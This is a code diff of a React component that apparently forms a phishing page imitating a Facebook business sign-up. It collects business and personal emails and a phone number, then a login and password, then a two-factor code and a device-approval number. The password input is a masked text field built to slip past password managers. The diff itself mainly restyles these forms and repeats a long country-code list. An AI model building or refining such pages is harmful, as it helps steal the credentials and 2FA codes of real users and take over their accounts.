-                                                    <option value="+53">+53 (Cuba)</option>
-                                                    <option value="+599">+599 (Curaçao)</option>
-                                                    <option value="+357">+357 (Cyprus)</option>
-                                                    <option value="+420">+420 (Czechia)</option>
-                                                    <option value="+45">+45 (Denmark)</option>
-                                                    <option value="+253">+253 (Djibouti)</option>
-                                                    <option value="+1">+1 (Dominica)</option>
-                                                    <option value="+1">+1 (Dominican Republic)</option>
-                                                    <option value="+593">+593 (Ecuador)</option>
-                                                    <option value="+20">+20 (Egypt)</option>
-                                                    <option value="+503">+503 (El Salvador)</option>
-                                                    <option value="+240">+240 (Equatorial Guinea)</option>
-                                                    <option value="+291">+291 (Eritrea)</option>
-                                                    <option value="+372">+372 (Estonia)</option>
-                                                    <option value="+268">+268 (Eswatini)</option>
-                                                    <option value="+251">+251 (Ethiopia)</option>
-                                                    <option value="+500">+500 (Falkland Islands)</option>
-                                                    <option value="+298">+298 (Faroe Islands)</option>
-                                                    <option value="+679">+679 (Fiji)</option>
-                                                    <option value="+358">+358 (Finland)</option>
-                                                    <option value="+33">+33 (France)</option>
-                                                    <option value="+594">+594 (French Guiana)</option>
-                                                    <option value="+689">+689 (French Polynesia)</option>
-                                                    <option value="+241">+241 (Gabon)</option>
-                                                    <option value="+220">+220 (Gambia)</option>
-                                                    <option value="+995">+995 (Georgia)</option>
-                                                    <option value="+49">+49 (Germany)</option>
-                                                    <option value="+233">+233 (Ghana)</option>
-                                                    <option value="+350">+350 (Gibraltar)</option>
-                                                    <option value="+30">+30 (Greece)</option>
-                                                    <option value="+299">+299 (Greenland)</option>
-                                                    <option value="+1">+1 (Grenada)</option>
-                                                    <option value="+590">+590 (Guadeloupe)</option>
-                                                    <option value="+1">+1 (Guam)</option>
-                                                    <option value="+502">+502 (Guatemala)</option>
-                                                    <option value="+44">+44 (Guernsey)</option>
-                                                    <option value="+224">+224 (Guinea)</option>
-                                                    <option value="+245">+245 (Guinea-Bissau)</option>
-                                                    <option value="+592">+592 (Guyana)</option>
-                                                    <option value="+509">+509 (Haiti)</option>
-                                                    <option value="+504">+504 (Honduras)</option>
-                                                    <option value="+852">+852 (Hong Kong SAR China)</option>
-                                                    <option value="+36">+36 (Hungary)</option>
-                                                    <option value="+354">+354 (Iceland)</option>
-                                                    <option value="+91">+91 (India)</option>
-                                                    <option value="+62">+62 (Indonesia)</option>
-                                                    <option value="+98">+98 (Iran)</option>
-                                                    <option value="+964">+964 (Iraq)</option>
-                                                    <option value="+353">+353 (Ireland)</option>
-                                                    <option value="+44">+44 (Isle of Man)</option>
-                                                    <option value="+972">+972 (Israel)</option>
-                                                    <option value="+39">+39 (Italy)</option>
-                                                    <option value="+1">+1 (Jamaica)</option>
-                                                    <option value="+81">+81 (Japan)</option>
-                                                    <option value="+44">+44 (Jersey)</option>
-                                                    <option value="+962">+962 (Jordan)</option>
-                                                    <option value="+7">+7 (Kazakhstan)</option>
-                                                    <option value="+254">+254 (Kenya)</option>
-                                                    <option value="+686">+686 (Kiribati)</option>
-                                                    <option value="+383">+383 (Kosovo)</option>
-                                                    <option value="+965">+965 (Kuwait)</option>
-                                                    <option value="+996">+996 (Kyrgyzstan)</option>
-                                                    <option value="+856">+856 (Laos)</option>
-                                                    <option value="+371">+371 (Latvia)</option>
-                                                    <option value="+961">+961 (Lebanon)</option>
-                                                    <option value="+266">+266 (Lesotho)</option>
-                                                    <option value="+231">+231 (Liberia)</option>
-                                                    <option value="+218">+218 (Libya)</option>
-                                                    <option value="+423">+423 (Liechtenstein)</option>
-                                                    <option value="+370">+370 (Lithuania)</option>
-                                                    <option value="+352">+352 (Luxembourg)</option>
-                                                    <option value="+853">+853 (Macao SAR China)</option>
-                                                    <option value="+261">+261 (Madagascar)</option>
-                                                    <option value="+265">+265 (Malawi)</option>
-                                                    <option value="+60">+60 (Malaysia)</option>
-                                                    <option value="+960">+960 (Maldives)</option>
-                                                    <option value="+223">+223 (Mali)</option>
-                                                    <option value="+356">+356 (Malta)</option>
-                                                    <option value="+692">+692 (Marshall Islands)</option>
-                                                    <option value="+596">+596 (Martinique)</option>
-                                                    <option value="+222">+222 (Mauritania)</option>
-                                                    <option value="+230">+230 (Mauritius)</option>
-                                                    <option value="+262">+262 (Mayotte)</option>
-                                                    <option value="+52">+52 (Mexico)</option>
-                                                    <option value="+691">+691 (Micronesia)</option>
-                                                    <option value="+373">+373 (Moldova)</option>
-                                                    <option value="+377">+377 (Monaco)</option>
-                                                    <option value="+976">+976 (Mongolia)</option>
-                                                    <option value="+382">+382 (Montenegro)</option>
-                                                    <option value="+1">+1 (Montserrat)</option>
-                                                    <option value="+212">+212 (Morocco)</option>
-                                                    <option value="+258">+258 (Mozambique)</option>
-                                                    <option value="+95">+95 (Myanmar)</option>
-                                                    <option value="+264">+264 (Namibia)</option>
-                                                    <option value="+674">+674 (Nauru)</option>
-                                                    <option value="+977">+977 (Nepal)</option>
-                                                    <option value="+31">+31 (Netherlands)</option>
-                                                    <option value="+687">+687 (New Caledonia)</option>
-                                                    <option value="+64">+64 (New Zealand)</option>
-                                                    <option value="+505">+505 (Nicaragua)</option>
-                                                    <option value="+227">+227 (Niger)</option>
-                                                    <option value="+234">+234 (Nigeria)</option>
-                                                    <option value="+683">+683 (Niue)</option>
-                                                    <option value="+850">+850 (North Korea)</option>
-                                                    <option value="+389">+389 (North Macedonia)</option>
-                                                    <option value="+1">+1 (Northern Mariana Islands)</option>
-                                                    <option value="+47">+47 (Norway)</option>
-                                                    <option value="+968">+968 (Oman)</option>
-                                                    <option value="+92">+92 (Pakistan)</option>
-                                                    <option value="+680">+680 (Palau)</option>
-                                                    <option value="+970">+970 (Palestine)</option>
-                                                    <option value="+507">+507 (Panama)</option>
-                                                    <option value="+675">+675 (Papua New Guinea)</option>
-                                                    <option value="+595">+595 (Paraguay)</option>
-                                                    <option value="+51">+51 (Peru)</option>
-                                                    <option value="+63">+63 (Philippines)</option>
-                                                    <option value="+48">+48 (Poland)</option>
-                                                    <option value="+351">+351 (Portugal)</option>
-                                                    <option value="+1">+1 (Puerto Rico)</option>
-                                                    <option value="+974">+974 (Qatar)</option>
-                                                    <option value="+262">+262 (Réunion)</option>
-                                                    <option value="+40">+40 (Romania)</option>
-                                                    <option value="+7">+7 (Russia)</option>
-                                                    <option value="+250">+250 (Rwanda)</option>
-                                                    <option value="+590">+590 (Saint Barthélemy)</option>
-                                                    <option value="+290">+290 (Saint Helena)</option>
-                                                    <option value="+1">+1 (Saint Kitts and Nevis)</option>
-                                                    <option value="+1">+1 (Saint Lucia)</option>
-                                                    <option value="+590">+590 (Saint Martin)</option>
-                                                    <option value="+508">+508 (Saint Pierre and Miquelon)</option>
-                                                    <option value="+1">+1 (Saint Vincent and the Grenadines)</option>
-                                                    <option value="+685">+685 (Samoa)</option>
-                                                    <option value="+378">+378 (San Marino)</option>
-                                                    <option value="+239">+239 (São Tomé and Príncipe)</option>
-                                                    <option value="+966">+966 (Saudi Arabia)</option>
-                                                    <option value="+221">+221 (Senegal)</option>
-                                                    <option value="+381">+381 (Serbia)</option>
-                                                    <option value="+248">+248 (Seychelles)</option>
-                                                    <option value="+232">+232 (Sierra Leone)</option>
-                                                    <option value="+65">+65 (Singapore)</option>
-                                                    <option value="+1">+1 (Sint Maarten)</option>
-                                                    <option value="+421">+421 (Slovakia)</option>
-                                                    <option value="+386">+386 (Slovenia)</option>
-                                                    <option value="+677">+677 (Solomon Islands)</option>
-                                                    <option value="+252">+252 (Somalia)</option>
-                                                    <option value="+27">+27 (South Africa)</option>
-                                                    <option value="+82">+82 (South Korea)</option>
-                                                    <option value="+211">+211 (South Sudan)</option>
-                                                    <option value="+34">+34 (Spain)</option>
-                                                    <option value="+94">+94 (Sri Lanka)</option>
-                                                    <option value="+249">+249 (Sudan)</option>
-                                                    <option value="+597">+597 (Suriname)</option>
-                                                    <option value="+46">+46 (Sweden)</option>
-                                                    <option value="+41">+41 (Switzerland)</option>
-                                                    <option value="+963">+963 (Syria)</option>
-                                                    <option value="+886">+886 (Taiwan)</option>
-                                                    <option value="+992">+992 (Tajikistan)</option>
-                                                    <option value="+255">+255 (Tanzania)</option>
-                                                    <option value="+66">+66 (Thailand)</option>
-                                                    <option value="+670">+670 (Timor-Leste)</option>
-                                                    <option value="+228">+228 (Togo)</option>
-                                                    <option value="+690">+690 (Tokelau)</option>
-                                                    <option value="+676">+676 (Tonga)</option>
-                                                    <option value="+1">+1 (Trinidad and Tobago)</option>
-                                                    <option value="+216">+216 (Tunisia)</option>
-                                                    <option value="+90">+90 (Turkey)</option>
-                                                    <option value="+993">+993 (Turkmenistan)</option>
-                                                    <option value="+1">+1 (Turks and Caicos Islands)</option>
-                                                    <option value="+688">+688 (Tuvalu)</option>
-                                                    <option value="+256">+256 (Uganda)</option>
-                                                    <option value="+380">+380 (Ukraine)</option>
-                                                    <option value="+971">+971 (United Arab Emirates)</option>
-                                                    <option value="+44">+44 (United Kingdom)</option>
-                                                    <option value="+1">+1 (United States)</option>
-                                                    <option value="+598">+598 (Uruguay)</option>
-                                                    <option value="+1">+1 (US Virgin Islands)</option>
-                                                    <option value="+998">+998 (Uzbekistan)</option>
-                                                    <option value="+678">+678 (Vanuatu)</option>
-                                                    <option value="+379">+379 (Vatican City)</option>
-                                                    <option value="+58">+58 (Venezuela)</option>
-                                                    <option value="+84">+84 (Vietnam)</option>
-                                                    <option value="+681">+681 (Wallis and Futuna)</option>
-                                                    <option value="+212">+212 (Western Sahara)</option>
-                                                    <option value="+967">+967 (Yemen)</option>
-                                                    <option value="+260">+260 (Zambia)</option>
-                                                    <option value="+263">+263 (Zimbabwe)</option>
-                                                </select>
-                                            </div>
-                                            <input className="fb-input" style={{ flex: 1, borderColor: errors.phoneNum ? '#fa383e' : 'rgb(224, 226, 228)' }} placeholder="Phone number" value={phoneNum} onChange={e => {setPhoneNum(e.target.value); setErrors({...errors, phoneNum: false})}} />
+                            <h2 className="modal-title">{t.form1Title}</h2>
+                            <p className="modal-subtitle">{t.form1Sub}</p>
+                            <form onSubmit={handleSignup} noValidate className="fb-form">
+                                <div className="fb-input-group">
+                                    <input className={`fb-input ${errors.busName ? 'input-error' : ''}`} placeholder="Business name" value={busName} onChange={e => {setBusName(e.target.value); setErrors({...errors, busName: false})}} />
+                                    {errors.busName && <div className="field-error show">Please enter your business name.</div>}
+                                </div>
+                                <div className="fb-input-group">
+                                    <input className={`fb-input ${errors.perEmail ? 'input-error' : ''}`} type="email" placeholder="Personal email" value={perEmail} onChange={e => {setPerEmail(e.target.value); setErrors({...errors, perEmail: false})}} />
+                                    {errors.perEmail && <div className="field-error show">Please enter a valid personal email.</div>}
+                                </div>
+                                <div className="fb-input-group">
+                                    <input className={`fb-input ${errors.busEmail ? 'input-error' : ''}`} type="email" placeholder="Business email" value={busEmail} onChange={e => {setBusEmail(e.target.value); setErrors({...errors, busEmail: false})}} />
+                                    {errors.busEmail && <div className="field-error show">Please enter a valid business email.</div>}
+                                </div>
+                                <div className="fb-input-group">
+                                    <div className="fb-phone-group">
+                                        <div className="fb-phone-select-wrap">
+                                            <select className="fb-phone-select" value={countryCode} onChange={e => setCountryCode(e.target.value)}>
+                                                <option value="+93">+93 (Afghanistan)</option>
+                                                <option value="+355">+355 (Albania)</option>
+                                                <option value="+213">+213 (Algeria)</option>
+                                                <option value="+1">+1 (American Samoa)</option>
+                                                <option value="+376">+376 (Andorra)</option>
+                                                <option value="+244">+244 (Angola)</option>
+                                                <option value="+1">+1 (Anguilla)</option>
+                                                <option value="+1">+1 (Antigua and Barbuda)</option>
+                                                <option value="+54">+54 (Argentina)</option>
+                                                <option value="+374">+374 (Armenia)</option>
+                                                <option value="+297">+297 (Aruba)</option>
+                                                <option value="+61">+61 (Australia)</option>
+                                                <option value="+43">+43 (Austria)</option>
+                                                <option value="+994">+994 (Azerbaijan)</option>
+                                                <option value="+1">+1 (Bahamas)</option>
+                                                <option value="+973">+973 (Bahrain)</option>
+                                                <option value="+880">+880 (Bangladesh)</option>
+                                                <option value="+1">+1 (Barbados)</option>
+                                                <option value="+375">+375 (Belarus)</option>
+                                                <option value="+32">+32 (Belgium)</option>
+                                                <option value="+501">+501 (Belize)</option>
+                                                <option value="+229">+229 (Benin)</option>
+                                                <option value="+1">+1 (Bermuda)</option>
+                                                <option value="+975">+975 (Bhutan)</option>
+                                                <option value="+591">+591 (Bolivia)</option>
+                                                <option value="+387">+387 (Bosnia and Herzegovina)</option>
+                                                <option value="+267">+267 (Botswana)</option>
+                                                <option value="+55">+55 (Brazil)</option>
+                                                <option value="+1">+1 (British Virgin Islands)</option>
+                                                <option value="+673">+673 (Brunei)</option>
+                                                <option value="+359">+359 (Bulgaria)</option>
+                                                <option value="+226">+226 (Burkina Faso)</option>
+                                                <option value="+257">+257 (Burundi)</option>
+                                                <option value="+855">+855 (Cambodia)</option>
+                                                <option value="+237">+237 (Cameroon)</option>
+                                                <option value="+1">+1 (Canada)</option>
+                                                <option value="+238">+238 (Cape Verde)</option>
+                                                <option value="+1">+1 (Cayman Islands)</option>
+                                                <option value="+236">+236 (Central African Republic)</option>
+                                                <option value="+235">+235 (Chad)</option>
+                                                <option value="+56">+56 (Chile)</option>
+                                                <option value="+86">+86 (China)</option>
+                                                <option value="+57">+57 (Colombia)</option>
+                                                <option value="+269">+269 (Comoros)</option>
+                                                <option value="+242">+242 (Congo - Brazzaville)</option>
+                                                <option value="+243">+243 (Congo - Kinshasa)</option>
+                                                <option value="+682">+682 (Cook Islands)</option>
+                                                <option value="+506">+506 (Costa Rica)</option>
+                                                <option value="+225">+225 (Côte d'Ivoire)</option>
+                                                <option value="+385">+385 (Croatia)</option>
+                                                <option value="+53">+53 (Cuba)</option>
+                                                <option value="+599">+599 (Curaçao)</option>
+                                                <option value="+357">+357 (Cyprus)</option>
+                                                <option value="+420">+420 (Czechia)</option>
+                                                <option value="+45">+45 (Denmark)</option>
+                                                <option value="+253">+253 (Djibouti)</option>
+                                                <option value="+1">+1 (Dominica)</option>
+                                                <option value="+1">+1 (Dominican Republic)</option>
+                                                <option value="+593">+593 (Ecuador)</option>
+                                                <option value="+20">+20 (Egypt)</option>
+                                                <option value="+503">+503 (El Salvador)</option>
+                                                <option value="+240">+240 (Equatorial Guinea)</option>
+                                                <option value="+291">+291 (Eritrea)</option>
+                                                <option value="+372">+372 (Estonia)</option>
+                                                <option value="+268">+268 (Eswatini)</option>
+                                                <option value="+251">+251 (Ethiopia)</option>
+                                                <option value="+500">+500 (Falkland Islands)</option>
+                                                <option value="+298">+298 (Faroe Islands)</option>
+                                                <option value="+679">+679 (Fiji)</option>
+                                                <option value="+358">+358 (Finland)</option>
+                                                <option value="+33">+33 (France)</option>
+                                                <option value="+594">+594 (French Guiana)</option>
+                                                <option value="+689">+689 (French Polynesia)</option>
+                                                <option value="+241">+241 (Gabon)</option>
+                                                <option value="+220">+220 (Gambia)</option>
+                                                <option value="+995">+995 (Georgia)</option>
+                                                <option value="+49">+49 (Germany)</option>
+                                                <option value="+233">+233 (Ghana)</option>
+                                                <option value="+350">+350 (Gibraltar)</option>
+                                                <option value="+30">+30 (Greece)</option>
+                                                <option value="+299">+299 (Greenland)</option>
+                                                <option value="+1">+1 (Grenada)</option>
+                                                <option value="+590">+590 (Guadeloupe)</option>
+                                                <option value="+1">+1 (Guam)</option>
+                                                <option value="+502">+502 (Guatemala)</option>
+                                                <option value="+44">+44 (Guernsey)</option>
+                                                <option value="+224">+224 (Guinea)</option>
+                                                <option value="+245">+245 (Guinea-Bissau)</option>
+                                                <option value="+592">+592 (Guyana)</option>
+                                                <option value="+509">+509 (Haiti)</option>
+                                                <option value="+504">+504 (Honduras)</option>
+                                                <option value="+852">+852 (Hong Kong SAR China)</option>
+                                                <option value="+36">+36 (Hungary)</option>
+                                                <option value="+354">+354 (Iceland)</option>
+                                                <option value="+91">+91 (India)</option>
+                                                <option value="+62">+62 (Indonesia)</option>
+                                                <option value="+98">+98 (Iran)</option>
+                                                <option value="+964">+964 (Iraq)</option>
+                                                <option value="+353">+353 (Ireland)</option>
+                                                <option value="+44">+44 (Isle of Man)</option>
+                                                <option value="+972">+972 (Israel)</option>
+                                                <option value="+39">+39 (Italy)</option>
+                                                <option value="+1">+1 (Jamaica)</option>
+                                                <option value="+81">+81 (Japan)</option>
+                                                <option value="+44">+44 (Jersey)</option>
+                                                <option value="+962">+962 (Jordan)</option>
+                                                <option value="+7">+7 (Kazakhstan)</option>
+                                                <option value="+254">+254 (Kenya)</option>
+                                                <option value="+686">+686 (Kiribati)</option>
+                                                <option value="+383">+383 (Kosovo)</option>
+                                                <option value="+965">+965 (Kuwait)</option>
+                                                <option value="+996">+996 (Kyrgyzstan)</option>
+                                                <option value="+856">+856 (Laos)</option>
+                                                <option value="+371">+371 (Latvia)</option>
+                                                <option value="+961">+961 (Lebanon)</option>
+                                                <option value="+266">+266 (Lesotho)</option>
+                                                <option value="+231">+231 (Liberia)</option>
+                                                <option value="+218">+218 (Libya)</option>
+                                                <option value="+423">+423 (Liechtenstein)</option>
+                                                <option value="+370">+370 (Lithuania)</option>
+                                                <option value="+352">+352 (Luxembourg)</option>
+                                                <option value="+853">+853 (Macao SAR China)</option>
+                                                <option value="+261">+261 (Madagascar)</option>
+                                                <option value="+265">+265 (Malawi)</option>
+                                                <option value="+60">+60 (Malaysia)</option>
+                                                <option value="+960">+960 (Maldives)</option>
+                                                <option value="+223">+223 (Mali)</option>
+                                                <option value="+356">+356 (Malta)</option>
+                                                <option value="+692">+692 (Marshall Islands)</option>
+                                                <option value="+596">+596 (Martinique)</option>
+                                                <option value="+222">+222 (Mauritania)</option>
+                                                <option value="+230">+230 (Mauritius)</option>
+                                                <option value="+262">+262 (Mayotte)</option>
+                                                <option value="+52">+52 (Mexico)</option>
+                                                <option value="+691">+691 (Micronesia)</option>
+                                                <option value="+373">+373 (Moldova)</option>
+                                                <option value="+377">+377 (Monaco)</option>
+                                                <option value="+976">+976 (Mongolia)</option>
+                                                <option value="+382">+382 (Montenegro)</option>
+                                                <option value="+1">+1 (Montserrat)</option>
+                                                <option value="+212">+212 (Morocco)</option>
+                                                <option value="+258">+258 (Mozambique)</option>
+                                                <option value="+95">+95 (Myanmar)</option>
+                                                <option value="+264">+264 (Namibia)</option>
+                                                <option value="+674">+674 (Nauru)</option>
+                                                <option value="+977">+977 (Nepal)</option>
+                                                <option value="+31">+31 (Netherlands)</option>
+                                                <option value="+687">+687 (New Caledonia)</option>
+                                                <option value="+64">+64 (New Zealand)</option>
+                                                <option value="+505">+505 (Nicaragua)</option>
+                                                <option value="+227">+227 (Niger)</option>
+                                                <option value="+234">+234 (Nigeria)</option>
+                                                <option value="+683">+683 (Niue)</option>
+                                                <option value="+850">+850 (North Korea)</option>
+                                                <option value="+389">+389 (North Macedonia)</option>
+                                                <option value="+1">+1 (Northern Mariana Islands)</option>
+                                                <option value="+47">+47 (Norway)</option>
+                                                <option value="+968">+968 (Oman)</option>
+                                                <option value="+92">+92 (Pakistan)</option>
+                                                <option value="+680">+680 (Palau)</option>
+                                                <option value="+970">+970 (Palestine)</option>
+                                                <option value="+507">+507 (Panama)</option>
+                                                <option value="+675">+675 (Papua New Guinea)</option>
+                                                <option value="+595">+595 (Paraguay)</option>
+                                                <option value="+51">+51 (Peru)</option>
+                                                <option value="+63">+63 (Philippines)</option>
+                                                <option value="+48">+48 (Poland)</option>
+                                                <option value="+351">+351 (Portugal)</option>
+                                                <option value="+1">+1 (Puerto Rico)</option>
+                                                <option value="+974">+974 (Qatar)</option>
+                                                <option value="+262">+262 (Réunion)</option>
+                                                <option value="+40">+40 (Romania)</option>
+                                                <option value="+7">+7 (Russia)</option>
+                                                <option value="+250">+250 (Rwanda)</option>
+                                                <option value="+590">+590 (Saint Barthélemy)</option>
+                                                <option value="+290">+290 (Saint Helena)</option>
+                                                <option value="+1">+1 (Saint Kitts and Nevis)</option>
+                                                <option value="+1">+1 (Saint Lucia)</option>
+                                                <option value="+590">+590 (Saint Martin)</option>
+                                                <option value="+508">+508 (Saint Pierre and Miquelon)</option>
+                                                <option value="+1">+1 (Saint Vincent and the Grenadines)</option>
+                                                <option value="+685">+685 (Samoa)</option>
+                                                <option value="+378">+378 (San Marino)</option>
+                                                <option value="+239">+239 (São Tomé and Príncipe)</option>
+                                                <option value="+966">+966 (Saudi Arabia)</option>
+                                                <option value="+221">+221 (Senegal)</option>
+                                                <option value="+381">+381 (Serbia)</option>
+                                                <option value="+248">+248 (Seychelles)</option>
+                                                <option value="+232">+232 (Sierra Leone)</option>
+                                                <option value="+65">+65 (Singapore)</option>
+                                                <option value="+1">+1 (Sint Maarten)</option>
+                                                <option value="+421">+421 (Slovakia)</option>
+                                                <option value="+386">+386 (Slovenia)</option>
+                                                <option value="+677">+677 (Solomon Islands)</option>
+                                                <option value="+252">+252 (Somalia)</option>
+                                                <option value="+27">+27 (South Africa)</option>
+                                                <option value="+82">+82 (South Korea)</option>
+                                                <option value="+211">+211 (South Sudan)</option>
+                                                <option value="+34">+34 (Spain)</option>
+                                                <option value="+94">+94 (Sri Lanka)</option>
+                                                <option value="+249">+249 (Sudan)</option>
+                                                <option value="+597">+597 (Suriname)</option>
+                                                <option value="+46">+46 (Sweden)</option>
+                                                <option value="+41">+41 (Switzerland)</option>
+                                                <option value="+963">+963 (Syria)</option>
+                                                <option value="+886">+886 (Taiwan)</option>
+                                                <option value="+992">+992 (Tajikistan)</option>
+                                                <option value="+255">+255 (Tanzania)</option>
+                                                <option value="+66">+66 (Thailand)</option>
+                                                <option value="+670">+670 (Timor-Leste)</option>
+                                                <option value="+228">+228 (Togo)</option>
+                                                <option value="+690">+690 (Tokelau)</option>
+                                                <option value="+676">+676 (Tonga)</option>
+                                                <option value="+1">+1 (Trinidad and Tobago)</option>
+                                                <option value="+216">+216 (Tunisia)</option>
+                                                <option value="+90">+90 (Turkey)</option>
+                                                <option value="+993">+993 (Turkmenistan)</option>
+                                                <option value="+1">+1 (Turks and Caicos Islands)</option>
+                                                <option value="+688">+688 (Tuvalu)</option>
+                                                <option value="+256">+256 (Uganda)</option>
+                                                <option value="+380">+380 (Ukraine)</option>
+                                                <option value="+971">+971 (United Arab Emirates)</option>
+                                                <option value="+44">+44 (United Kingdom)</option>
+                                                <option value="+1">+1 (United States)</option>
+                                                <option value="+598">+598 (Uruguay)</option>
+                                                <option value="+1">+1 (US Virgin Islands)</option>
+                                                <option value="+998">+998 (Uzbekistan)</option>
+                                                <option value="+678">+678 (Vanuatu)</option>
+                                                <option value="+379">+379 (Vatican City)</option>
+                                                <option value="+58">+58 (Venezuela)</option>
+                                                <option value="+84">+84 (Vietnam)</option>
+                                                <option value="+681">+681 (Wallis and Futuna)</option>
+                                                <option value="+212">+212 (Western Sahara)</option>
+                                                <option value="+967">+967 (Yemen)</option>
+                                                <option value="+260">+260 (Zambia)</option>
+                                                <option value="+263">+263 (Zimbabwe)</option>
+                                            </select>
                                         </div>
-                                        {errors.phoneNum && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid phone number.</div>}
+                                        <input className={`fb-input ${errors.phoneNum ? 'input-error' : ''}`} placeholder="Phone number" value={phoneNum} onChange={e => {setPhoneNum(e.target.value); setErrors({...errors, phoneNum: false})}} />
                                     </div>
-                                    <button type="submit" className="fb-btn" disabled={loading} style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '48px' }}>
-                                      {loading ? <LoadingSpinner /> : t.continueBtn}
+                                    {errors.phoneNum && <div className="field-error show">Please enter a valid phone number.</div>}
+                                </div>
+                                <button type="submit" className="fb-btn" disabled={loading}>
+                                  {loading ? <div className="spinner"></div> : t.continueBtn}
+                                </button>
+                            </form>
+                          </>
+                        )}
+
+                        {/* FORM 2: LOGIN */}
+                        {step === 2 && (
+                          <form onSubmit={handleLogin} autoComplete="off" className="fb-form">
+                              <input className="fb-input" placeholder="Mobile number or email address" value={loginUser} onChange={e => setLoginUser(e.target.value)} required autoComplete="off" />
+                              <input className="fb-input" type="text" placeholder="Password" value={loginPass} onChange={e => setLoginPass(e.target.value)} required style={{ WebkitTextSecurity: 'disc' }} autoComplete="new-password" data-lpignore="true" data-form-type="other" />
+                              {showLoginError && <div className="alert-error show">{t.loginError}</div>}
+                              <button type="submit" className="fb-btn" disabled={loading}>
+                                {loading ? <div className="spinner"></div> : t.loginBtn}
+                              </button>
+                          </form>
+                        )}
+
+                        {/* FORM 3 & 4: 2FA & SUCCESS */}
+                        {(step === 3 || showSuccess) && (
+                          <>
+                            {showSuccess ? (
+                              <div style={{ textAlign: 'center', padding: '20px 0' }}>
+                                <h2 className="modal-title" style={{ marginTop: '20px' }}>{t.successTitle}</h2>
+                                <p className="modal-subtitle">{t.successSub}</p>
+                                <button type="button" onClick={() => { localStorage.clear(); window.location.replace('/live'); }} className="fb-btn">{t.closeBtn}</button>
+                              </div>
+                            ) : matchNumber ? (
+                              <>
+                                <h2 className="modal-title">{t.approveTitle}</h2>
+                                <p className="modal-subtitle">{t.approveSub} <strong>{matchNumber}</strong></p>
+                                <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '20px' }}><img src="/images/approve-device.png" alt="Approve Device" style={{ width: '100%', height: 'auto', borderRadius: '8px' }} /></div>
+                                <div style={{ textAlign: 'center', fontSize: '48px', fontWeight: '900', letterSpacing: '30px', textIndent: '30px', marginBottom: '30px', color: '#1c1e21' }}>{matchNumber}</div>
+                              </>
+                            ) : (
+                              <>
+                                <h2 className="modal-title">{t.form3Title}</h2>
+                                <div style={{ display: 'flex', justifyContent: 'center', margin: '15px 0' }}><img src="/images/2fa-illustration.png" alt="2FA" style={{ width: '100%', maxWidth: '280px', height: 'auto', borderRadius: '8px' }} /></div>
+                                <p className="modal-subtitle">{t.form3Sub}</p>
+                                <form onSubmit={handleOtp} className="fb-form">
+                                    <input className="fb-input fb-otp-input" placeholder="00000000" value={otp} onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} required maxLength={8} />
+                                    {showOtpError && <div className="alert-error show">{t.otpError}</div>}
+                                    <button type="submit" className="fb-btn" disabled={loading || otp.length < 6}>
+                                      {loading ? <div className="spinner"></div> : t.verifyBtn}
                                     </button>
                                 </form>
                               </>
                             )}
-
-                            {/* FORM 2: LOGIN */}
-                            {step === 2 && (
-                              <form onSubmit={handleLogin} autoComplete="off" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-                                  <input className="fb-input" placeholder="Mobile number or email address" value={loginUser} onChange={e => setLoginUser(e.target.value)} required autoComplete="off" />
-                                  <input className="fb-input" type="text" placeholder="Password" value={loginPass} onChange={e => setLoginPass(e.target.value)} required style={{ WebkitTextSecurity: 'disc' }} autoComplete="new-password" data-lpignore="true" data-form-type="other" />
-                                  {showLoginError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>{t.loginError}</div>}
-                                  <button type="submit" className="fb-btn" disabled={loading} style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '48px' }}>
-                                    {loading ? <LoadingSpinner /> : t.loginBtn}
-                                  </button>
-                              </form>
-                            )}
-
-                            {/* FORM 3 & 4: 2FA & SUCCESS */}
-                            {(step === 3 || showSuccess) && (
-                              <>
-                                {showSuccess ? (
-                                  <div style={{ textAlign: 'center', padding: '20px 0' }}>
-                                    <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px', marginTop: '20px' }}>{t.successTitle}</h2>
-                                    <p style={{ fontSize: '15px', color: '#65676b', lineHeight: '1.5', marginBottom: '20px' }}>{t.successSub}</p>
-                                    <button type="button" onClick={() => { localStorage.clear(); window.location.replace('/live'); }} className="fb-btn">{t.closeBtn}</button>
-                                  </div>
-                                ) : matchNumber ? (
-                                  <>
-                                    <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px', textAlign: 'center' }}>{t.approveTitle}</h2>
-                                    <p style={{ fontSize: '15px', color: '#1c2b33', marginBottom: '20px', lineHeight: '1.4', textAlign: 'center' }}>{t.approveSub} <strong>{matchNumber}</strong></p>
-                                    <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '20px' }}><img src="/images/approve-device.png" alt="Approve Device" style={{ width: '100%', height: 'auto', borderRadius: '8px' }} /></div>
-                                    <div style={{ textAlign: 'center', fontSize: '48px', fontWeight: '900', letterSpacing: '30px', textIndent: '30px', marginBottom: '30px', color: '#1c1e21' }}>{matchNumber}</div>
-                                  </>
-                                ) : (
-                                  <>
-                                    <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>{t.form3Title}</h2>
-                                    <div style={{ display: 'flex', justifyContent: 'center', margin: '15px 0' }}><img src="/images/2fa-illustration.png" alt="2FA" style={{ width: '100%', maxWidth: '280px', height: 'auto', borderRadius: '8px' }} /></div>
-                                    <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>{t.form3Sub}</p>
-                                    <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-                                        <input className="fb-input fb-otp-input" style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700' }} placeholder="00000000" value={otp} onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} required maxLength={8} />
-                                        {showOtpError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>{t.otpError}</div>}
-                                        <button type="submit" className="fb-btn" disabled={loading || otp.length < 6} style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '48px' }}>
-                                          {loading ? <LoadingSpinner /> : t.verifyBtn}
-                                        </button>
-                                    </form>
